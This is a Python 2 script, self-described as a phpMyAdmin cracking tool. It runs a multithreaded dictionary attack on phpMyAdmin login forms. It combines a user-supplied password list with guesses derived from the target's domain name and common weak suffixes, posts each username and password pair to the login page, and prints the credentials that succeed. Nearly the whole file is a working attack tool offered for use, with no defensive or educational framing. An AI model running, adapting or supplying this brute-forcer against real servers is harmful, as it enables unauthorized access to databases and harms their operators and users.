#!/usr/bin/python
# -*- coding: UTF-8 -*-

import urllib
import urllib2
import getopt
import threading,sys
import time
import re
import httplib
import requests
import cStringIO
from Queue import  Queue
import platform
import socket
import signal


'''
解决在Windows下乱码问题
'''
class UnicodeStreamFilter:
    def __init__(self, target):
        self.target = target
        self.encoding = 'utf-8'
        self.errors = 'replace'
        self.encode_to = self.target.encoding
    def write(self, s):
        if type(s) == str:
            s = s.decode("utf-8")
        s = s.encode(self.encode_to, self.errors).decode(self.encode_to)
        self.target.write(s)

if sys.stdout.encoding == 'cp936':
    sys.stdout = UnicodeStreamFilter(sys.stdout)




mutex = threading.RLock()
existsurl=[]
is_exit=False
sig=threading.Event()
timeout=10
socket.setdefaulttimeout(timeout)
MAXSIZE = 50000



'''
如果是Windows系统，导入cmd下的颜色库ctypes
'''
if platform.system()=='Windows':

            STD_INPUT_HANDLE = -10
            STD_OUTPUT_HANDLE= -11
            STD_ERROR_HANDLE = -12

            FOREGROUND_BLACK = 0x0
            FOREGROUND_BLUE = 0x01 # text color contains blue.
            FOREGROUND_GREEN= 0x02 # text color contains green.
            FOREGROUND_RED = 0x04 # text color contains red.
            FOREGROUND_INTENSITY = 0x08 # text color is intensified.

            BACKGROUND_BLUE = 0x10 # background color contains blue.
            BACKGROUND_GREEN= 0x20 # background color contains green.
            BACKGROUND_RED = 0x40 # background color contains red.
            BACKGROUND_INTENSITY = 0x80 # background color is intensified.
            try:
                import  ctypes

            except ImportError:
                   print 'ctypes module is not exists'
                   sys.exit()

            else:
                class ColorWindows:
                    ''''' See http://msdn.microsoft.com/library/default.asp?url=/library/en-us/winprog/winprog/windows_api_reference.asp
                    for information on Windows APIs.'''
                    std_out_handle = ctypes.windll.kernel32.GetStdHandle(STD_OUTPUT_HANDLE)

                    def set_cmd_color(self, color, handle=std_out_handle):
                        """(color) -> bit
                        Example: set_cmd_color(FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE | FOREGROUND_INTENSITY)
                        """
                        bool = ctypes.windll.kernel32.SetConsoleTextAttribute(handle, color)
                        return bool

                    def reset_color(self):
                        self.set_cmd_color(FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE)

                    def print_green_text(self, print_text):
                        self.set_cmd_color(FOREGROUND_GREEN | FOREGROUND_INTENSITY)
                        print print_text
                        self.reset_color()

                    def print_red_text(self, print_text):
                        self.set_cmd_color(FOREGROUND_RED | FOREGROUND_INTENSITY)
                        print print_text
                        self.reset_color()




'''
非Windows下的字体颜色设置
'''

class ColorOtherOS:
        def __init__(self):
            self.HEADER = '\033[95m'
            self.OKBLUE = '\033[94m'
            self.OKGREEN = '\033[92m'
            self.WARNING = '\033[93m'
            self.FAIL = '\033[91m'
            self.ENDC = '\033[0m'
        #为了统一函数名字，所以将函数名写成red，其实是blue
        def print_red_text(self,print_text):
            print self.OKBLUE+print_text+self.ENDC


def readdic(path):
    codes=list()
    try:
        fp=open(path,'r')
    except IOError,e:
        print e
        sys.exit()
    testcodes=fp.readlines()
    for testcode in testcodes[0:MAXSIZE]:
        testcode=testcode.replace('\r','')
        testcode=testcode.replace('\n','')
        testcode.strip()
        codes.append(testcode)

    fp.close()
    return list(set(codes))

def crack(url,user,pwd):
    pams = {'pma_username': user, 'pma_password': pwd}
    headers = {'User-Agent' : 'Mozilla/5.0 (Windows NT 6.1; WOW64)'}
    r = requests.post(url, headers = headers, data = pams)
    if 'name="login_form"' not in r.content:
	    existsurl.append("[*]  user:"+user+"/pwd:"+pwd + "-------------login sucess ![*]")
		#print user+" login success ![*]"
        #print '[*]  user:'+user+'->pwd:'+pwd + ' login sucess ![*]'
    else:
        print "[*]user:"+user+"/pwd:"+pwd + "-----------login fail ![*]"
def social(url):
    Spwd=[]
    Supwd=['123','1234','12','12345','123123','123456','qaz','wsx','asd','asdf','qazwsx','1qaz','1qaz2wsx','111','db','pass','password',
            'pwd','!@#','!@#$','2008','2009','2010','2011','2012','2013','2014','2015','2016','@)!!','@)!@','@)!#','@)!$','@)!%','@)!^','fuck','fuckyou','fucku','test']
    while url.find('/')!=-1:
        url=url.replace('/','')
    Purl=url.split('.')
    length=len(Purl)
    url3=''
    for i in range(length):
        url3+=Purl[i]
    Spwd.append(url3)
    if length==3:
        Spwd.append(Purl[0]+Purl[1])
        Spwd.append(Purl[1]+Purl[2])

    Supwd= list(set(Supwd))
    #print Suname
    for pwd in Supwd:
        Spwd.append(Purl[1]+pwd)

    return Spwd


def usage():
    print '''
    phpmyadmin crack v1.0 code by 菜牛
'''
    print "<Usage>: python pmacrack.py -u \"http://www.test.com/phpMyAdmin/\" [options]\n"
    print "[options]:"
    print "          -n --name     (default: root)"
    print "          -p --pwdfile  (dic path  c:/pwd.txt  /home/pwd.txt)"
    print "          -t --thread   (threads)"
    print "<example>:"
    print "          python pmacrack.py -u \"http://www.test.com/\" -t 5 -p d:\\test.txt"
    print "          python pmacrack.py -u \"http://www.test.com/\" -t 5 -p d:\\test.txt -n \"test\""
    sys.exit()
'''
多线程类
'''

class MultiThread(threading.Thread):
    global is_exit
    def __init__(self,url,user,queue):
        threading.Thread.__init__(self)
        self.url=url
        self.sharedata=queue
        self.user=user


    def run(self):
        while self.sharedata.qsize()>0:
            if is_exit :
                print self.getName()+' received a exit signal!!'
                sys.exit()
            else:
                pwd=self.sharedata.get()
                murl='http://'+self.url
                crack(murl,self.user,pwd)

'''
接受CTRL+C中断多线程信号，并设置退出全局变量
'''
def sigquit(a,b):
    global is_exit
    is_exit=True
    #print 'received a exit signal'
    sys.exit()


if platform.system()=='Windows':
    setcolor=ColorWindows()
else:
    setcolor=ColorOtherOS()


if __name__=='__main__':
    url=threads=pwdfile=name=None
    try:
         opts,args = getopt.getopt(sys.argv[1:],'u:t:p:n:',['url=','thread=','pwdfile=','name='])
    except getopt.GetoptError,e:
         usage()
    for opt,value in opts:
            if opt=='-u' or opt=='--url':
               url=value.replace('http://','')
            if opt=='-t' or opt=='--thread':
               threads=int(value)
            if opt=='-p' or opt=='--pwdfile':
               pwdfile=value
            if opt=='-n' or opt=='--name':
                name=value
            if opt=='-h' or opt=='--help':
               usage()
    if name is None:
        name='root'
    if not url or not threads or not pwdfile:
        usage()
    Surl=social(url)
    THS=[]
    dics=readdic(pwdfile)
    if len(dics)<1 :
        print 'dic is empty!'
        sys.exit()
    print 'load dic success!'
    time.sleep(1)
    for uinfo in Surl:
        dics.append(uinfo)
    dics=list(set(dics))
    time.sleep(1)
    pathqueue=Queue(MAXSIZE+len(Surl))
    for pwd in dics:
    	pathqueue.put(pwd)
    print 'There are %s user/pwd will be crack'% str(pathqueue.qsize())
    time.sleep(1)
    signal.signal(signal.SIGINT, sigquit)
    signal.signal(signal.SIGTERM, sigquit)
    print 'all threads is :'+str(threads)
    for i in range(threads):
        Th=MultiThread(url,name,pathqueue)
        THS.append(Th)
        Th.start()

    while  threading.active_count()>1:
        time.sleep(3)
    if len(existsurl)>0:
        print '='*70
        print '                          Crack Result'
        for items in existsurl:
            setcolor.print_red_text(items)
        print '='*70
    else:
        print 'Fuck,No Result!'
    print 'ALL Threads have done! Main Thread exit!'
    print 'crack over!'

